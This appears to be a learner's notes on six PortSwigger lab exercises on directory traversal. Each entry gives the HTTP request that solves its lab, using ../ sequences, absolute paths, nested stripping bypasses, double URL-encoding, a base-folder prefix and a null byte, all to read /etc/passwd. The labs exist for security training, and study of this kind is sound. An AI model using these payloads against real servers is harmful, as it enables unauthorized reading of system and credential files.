# Directory traversal
https://portswigger.net/web-security/file-path-traversal


1. Lab: File path traversal, simple case
https://portswigger.net/web-security/file-path-traversal/lab-simple

To solve the lab, retrieve the contents of the /etc/passwd file. 

request:
GET /image?filename=../../../etc/passwd HTTP/1.1

# traversed!

2. Lab: File path traversal, traversal sequences blocked with absolute path bypass
https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

 The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file. 

req:
GET /image?filename=/etc/passwd HTTP/1.1

(using full path from root/)

# traversed!

3. Lab: File path traversal, traversal sequences stripped non-recursively
https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

hint: You might be able to use nested traversal sequences, such as ....// or ....\/, which will revert to simple traversal sequences when the inner sequence is stripped. 

GET /image?filename=....//....//....//etc/passwd HTTP/1.1

# traversed!

4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd HTTP/1.1

('../../etc/passwd' urlencoded X2)

# traversed!


5. Lab: File path traversal, validation of start of path
https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

 To solve the lab, retrieve the contents of the /etc/passwd file. 

 if an application requires that the user-supplied filename must start with the expected base folder, such as /var/www/images, then it might be possible to include the required base folder followed by suitable traversal sequences. For example:

```htm
        filename=/var/www/images/../../../etc/passwd
```
request:
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1


# traversed!


6. Lab: File path traversal, validation of file extension with null byte bypass
https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

 If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:
filename=../../../etc/passwd%00.png

request:
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1


